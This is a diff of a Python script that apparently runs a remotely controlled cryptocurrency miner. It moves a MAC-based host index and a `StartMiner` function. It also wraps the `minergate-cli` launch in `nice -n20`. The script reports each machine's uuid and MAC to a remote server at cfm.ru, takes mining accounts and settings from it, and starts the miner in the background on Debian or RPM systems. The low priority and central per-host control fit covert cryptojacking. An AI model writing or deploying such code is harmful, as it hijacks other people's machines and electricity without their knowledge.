@@ -101,19 +101,23 @@ def GetCores():
 
 #print(GetMac(),GetCores())
 
+
+index = GetMac()
+
+
 def StartMiner():
     from conf import config
 
     if config[0]['os'] == 'deb':
         r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
         param = json.loads(r.text)
-        p = subprocess.Popen(["minergate-cli", "-user",param[0]['mail'], "-"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
+        p = subprocess.Popen(["nice","-n20","minergate-cli", "-user",param[0]['mail'], "-"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
         return True
 
     if config[0]['os'] == 'rpm':
         r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
         param = json.loads(r.text)
-        p = subprocess.Popen(["minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
+        p = subprocess.Popen(["nice","-n20","minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
         return True
 
 
@@ -127,26 +131,6 @@ def CreateRecord():
 
 CreateRecord()
 
-
-
-
-index = GetMac() 
-
-
-def StartMiner():
-    from conf import config
-
-    if config[0]['os'] == 'deb':
-        r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
-        param = json.loads(r.text)
-        p = subprocess.Popen(["minergate-cli", "-user",param[0]['mail'], "-"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
-        return True
-
-    if config[0]['os'] == 'rpm':
-        r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
-        param = json.loads(r.text)
-        p = subprocess.Popen(["minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
-        return True
 
 
 
